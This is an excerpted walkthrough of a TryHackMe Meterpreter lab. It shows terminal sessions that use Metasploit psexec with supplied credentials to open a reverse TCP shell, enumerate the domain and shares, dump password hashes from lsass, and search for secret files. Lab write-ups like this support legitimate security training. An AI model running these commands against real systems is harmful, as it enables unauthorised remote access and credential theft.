...
As discussed in the previous Metasploit rooms, Metasploit payloads can be initially divided into two categories; inline (also called single) and staged.
...
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Metasploit-Meterpreter]
└─$ msfconsole
...
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.37.70
RHOSTS => 10.10.37.70
msf6 exploit(windows/smb/psexec) > set SMBUser ballen
SMBUser => ballen
msf6 exploit(windows/smb/psexec) > set SMBPass Password1
SMBPass => Password1
msf6 exploit(windows/smb/psexec) > set LHOST 10.14.61.233
LHOST => 10.14.61.233
msf6 exploit(windows/smb/psexec) > exploit
[*] Started reverse TCP handler on 10.14.61.233:4444 
[*] 10.10.37.70:445 - Connecting to the server...
[*] 10.10.37.70:445 - Authenticating to 10.10.37.70:445 as user 'ballen'...
[*] 10.10.37.70:445 - Selecting PowerShell target
[*] 10.10.37.70:445 - Executing the payload...
[+] 10.10.37.70:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 10.10.37.70
[*] Meterpreter session 1 opened (10.14.61.233:4444 -> 10.10.37.70:57969) at 2025-04-26 14:15:00 +0200
...
Hint: Use the "post/windows/gather/enum_domain"

The answer is included in the output of `sysinfo` but let's use the `enum_domain` module for practice
...
[+] Domain Controller: ACME-TEST.FLASH.local (IP: 10.10.37.70)
...
Hint: Use the "post/windows/gather/enum_shares" module.

```bash
msf6 post(windows/gather/enum_domain) > use post/windows/gather/enum_shares
msf6 post(windows/gather/enum_shares) > setg session 1
session => 1
msf6 post(windows/gather/enum_shares) > run
[*] Running module against ACME-TEST (10.10.37.70)
...
Hint: You will need to migrate to the "lsass.exe" process first (ps will list its PID), then run "hashdump".
...
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:b8d5cd74f013db595a0f1e36c7c18593:::
meterpreter > 
```
...
Hint: You can use an online hash checker like crackstation.net
...
Hint: You can use any of these commands: search -f *.txt search -f secrets.txt
...
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 09:44:27 +0200
...
Hint: You can use any of these commands: search -f *.txt search -f realsecret.txt
...
Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 10:30:24 +0200
